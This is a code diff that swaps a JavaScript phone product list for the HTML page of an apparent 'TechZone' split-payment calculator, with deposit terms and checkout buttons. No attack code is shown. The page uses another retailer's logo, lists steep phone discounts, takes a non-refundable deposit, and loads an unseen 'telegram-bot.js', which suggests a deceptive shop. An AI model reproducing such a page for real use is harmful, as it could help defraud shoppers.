@@ -1,49 +1,165 @@
-const productsForSplitPayment = [
-    {
-        id: 'iphone16promax',
-        name: 'iPhone 16 Pro Max',
-        variants: [
-            { storage: '256GB', price: 769 },
-            { storage: '512GB', price: 869 },
-            { storage: '1TB', price: 969 },
-        ],
-        image: 'https://m.media-amazon.com/images/I/61UMlmDXG+L._AC_SX466_.jpg'
-    },
-    {
-        id: 'iphone15promax',
-        name: 'iPhone 15 Pro Max',
-        variants: [
-            { storage: '256GB', price: 629 },
-            { storage: '512GB', price: 729 },
-            { storage: '1TB', price: 829 },
-        ],
-        image: 'https://m.media-amazon.com/images/I/61v5Jay9F5L._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys25ultra',
-        name: 'Samsung Galaxy S25 Ultra',
-        variants: [
-            { storage: '256GB', price: 719 },
-            { storage: '512GB', price: 819 },
-            { storage: '1TB', price: 919 },
-        ],
-        image: 'https://m.media-amazon.com/images/I/61n0lmxP5-L._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys24ultra',
-        name: 'Samsung Galaxy S24 Ultra',
-        variants: [
-            { storage: '256GB', price: 599 },
-            { storage: '512GB', price: 699 },
-        ],
-        image: 'https://m.media-amazon.com/images/I/51E3rux4DgL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'airpods4',
-        name: 'AirPods 4th Generation',
-        variants: [
-            { storage: 'Standard', price: 129 }
-        ],
-        image: 'https://m.media-amazon.com/images/I/61df2M5+OnL._AC_SX466_.jpg'
-    }
-];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Split Payments - TechZone</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <!-- Header (Copied from index.html for consistency) -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <a href="index.html">
+                        <img src="https://1000logos.net/wp-content/uploads/2023/11/Swappie-Logo.png" alt="TechZone" style="height: 40px; width: auto;">
+                    </a>
+                </div>
+                <nav class="nav-desktop">
+                    <a href="index.html" class="nav-link" data-translate="home">Home</a>
+                    <a href="index.html#products" class="nav-link" data-translate="products">Products</a>
+                    <a href="split-payment.html" class="nav-link" data-translate="split_payment">Split Payment</a>
+                    <a href="about.html" class="nav-link" data-translate="about">About</a>
+                </nav>
+                <div class="header-actions">
+                    <a href="#" id="cart-button" class="cart-link">
+                        <i class="fas fa-shopping-cart"></i>
+                        <span id="cart-count" class="cart-count">0</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="page-content" style="padding: 4rem 2rem;">
+        <div class="container" style="max-width: 800px; margin: auto;">
+            <div class="section-header" style="text-align: center; margin-bottom: 3rem;">
+                <h1 data-translate="split_payment_title">Pay in Installments</h1>
+                <p data-translate="split_payment_desc" style="font-size: 1.1rem; color: #555;">Pay a 50% deposit today and split the rest over up to 6 months.</p>
+            </div>
+
+            <div class="split-payment-calculator" style="background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.08);">
+                
+                <!-- Step 1: Product Selection -->
+                <div class="form-group" style="margin-bottom: 1.5rem;">
+                    <label for="product-select" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">1. Select a Product</label>
+                    <select id="product-select" class="form-control" style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
+                        <option value="">-- Choose a product --</option>
+                    </select>
+                </div>
+
+                <!-- Step 2: Variant Selection -->
+                <div class="form-group" style="margin-bottom: 1.5rem; display: none;" id="storage-group">
+                    <label for="storage-select" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">2. Select Storage</label>
+                    <select id="storage-select" class="form-control" style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;"></select>
+                </div>
+
+                <!-- Step 3: Installment Plan -->
+                <div class="form-group" style="margin-bottom: 1.5rem; display: none;" id="months-group">
+                    <label for="months-select" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">3. Choose Your Plan</label>
+                    <select id="months-select" class="form-control" style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
+                        <option value="1">1 Month (+2% interest)</option>
+                        <option value="2">2 Months (+3% interest)</option>
+                        <option value="3">3 Months (+4% interest)</option>
+                        <option value="4">4 Months (+5% interest)</option>
+                        <option value="5">5 Months (+6% interest)</option>
+                        <option value="6" selected>6 Months (+7% interest)</option>
+                    </select>
+                </div>
+
+                <!-- Calculation Display -->
+                <div id="calculation-summary" style="margin-top: 2rem; border-top: 1px solid #eee; padding-top: 2rem; display: none;">
+                    <h3 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 1.5rem; text-align: center;">Payment Summary</h3>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; font-size: 1.1rem;">
+                        
+                        <!-- Left Column -->
+                        <div style="padding-right: 1rem; border-right: 1px solid #eee;">
+                            <p style="margin-bottom: 0.75rem;"><strong>Product Price:</strong> <span id="summary-price"></span></p>
+                            <p style="margin-bottom: 0.75rem;"><strong>Interest (<span id="summary-interest-rate"></span>%):</strong> <span id="summary-interest-amount"></span></p>
+                            <p style="margin-bottom: 0.75rem; font-weight: bold;"><strong>New Total Price:</strong> <span id="summary-total-price"></span></p>
+                        </div>
+
+                        <!-- Right Column -->
+                        <div>
+                            <p style="margin-bottom: 0.75rem;"><strong>Deposit (50%):</strong> <span id="summary-deposit" style="color: #28a745; font-weight: bold;"></span></p>
+                            <p style="margin-bottom: 0.75rem;"><strong>Remaining Balance:</strong> <span id="summary-remaining"></span></p>
+                            <p style="margin-bottom: 0.75rem; font-weight: bold;"><strong>Monthly Payment:</strong> <span id="summary-monthly"></span></p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Step 4: Terms and Agreement -->
+                <div id="terms-section" style="margin-top: 2rem; border-top: 1px solid #eee; padding-top: 2rem; display: none;">
+                    <h3 style="font-size: 1.2rem; font-weight: 700; margin-bottom: 1rem;">Installment Plan Agreement</h3>
+                    <div class="terms-box" style="height: 150px; overflow-y: scroll; border: 1px solid #ddd; padding: 1rem; border-radius: 8px; font-size: 0.9rem; margin-bottom: 1rem; background: #f9f9f9;">
+                        <p>By proceeding, you agree to the following terms:</p>
+                        <ol style="padding-left: 1.5rem;">
+                            <li style="margin-bottom: 0.5rem;">You agree to pay a non-refundable 50% deposit of the total amount today.</li>
+                            <li style="margin-bottom: 0.5rem;">The remaining balance will be paid in equal monthly installments over the selected period.</li>
+                            <li style="margin-bottom: 0.5rem;">An interest rate, as specified in the summary, is applied to the original product price.</li>
+                            <li style="margin-bottom: 0.5rem;">Failure to make monthly payments on time may result in late fees or cancellation of the plan.</li>
+                            <li style="margin-bottom: 0.5rem;">The product will be delivered upon full payment of all installments.</li>
+                            <li>All payments are final. Please review our full <a href="terms.html" target="_blank" style="color: var(--primary-color);">Terms and Conditions</a> for more details.</li>
+                        </ol>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
+                        <div class="form-check" style="display: flex; align-items: center; gap: 0.5rem;">
+                            <input type="checkbox" id="terms-agree-checkbox" style="transform: scale(1.2);">
+                            <label for="terms-agree-checkbox" style="font-weight: 600; cursor: pointer;">I agree to the terms and conditions.</label>
+                        </div>
+                        <button id="download-agreement-btn" class="btn btn-secondary" style="padding: 0.5rem 1rem; font-size: 0.9rem;" disabled>
+                            <i class="fas fa-file-pdf"></i> Download Agreement
+                        </button>
+                    </div>
+                </div>
+                <!-- Checkout Button -->
+                <div class="text-center" style="margin-top: 2.5rem;">
+                    <button id="proceed-to-checkout" class="btn btn-primary" style="width: 100%; max-width: 400px; padding: 1rem; font-size: 1.2rem;" disabled>
+                        Pay Deposit & Start Plan
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer (Copied from index.html for consistency) -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-bottom">
+                <p>&copy; 2024 TechZone. <span data-translate="rights_reserved">All rights reserved.</span></p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Cart Sidebar (Required for checkout modal) -->
+    <div id="cart-overlay" class="cart-overlay">
+        <div id="cart-sidebar" class="cart-sidebar">
+            <div class="cart-header">
+                <h2 data-translate="shopping_cart">Shopping Cart</h2>
+                <button id="close-cart" aria-label="Close cart"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="cart-items" id="cart-items"></div>
+            <div class="cart-summary">
+                <div class="summary-row total">
+                    <span data-translate="total">Total:</span>
+                    <span id="cart-total">$0.00</span>
+                </div>
+            </div>
+            <div class="cart-actions">
+                <button id="checkout-btn" class="btn btn-primary" data-translate="checkout">Proceed to Checkout</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="telegram-bot.js"></script>
+    <script src="products-split-payment.js"></script>
+    <script src="script (7).js"></script>
+    <script src="split-payment.js"></script>
+
+</body>
+</html>
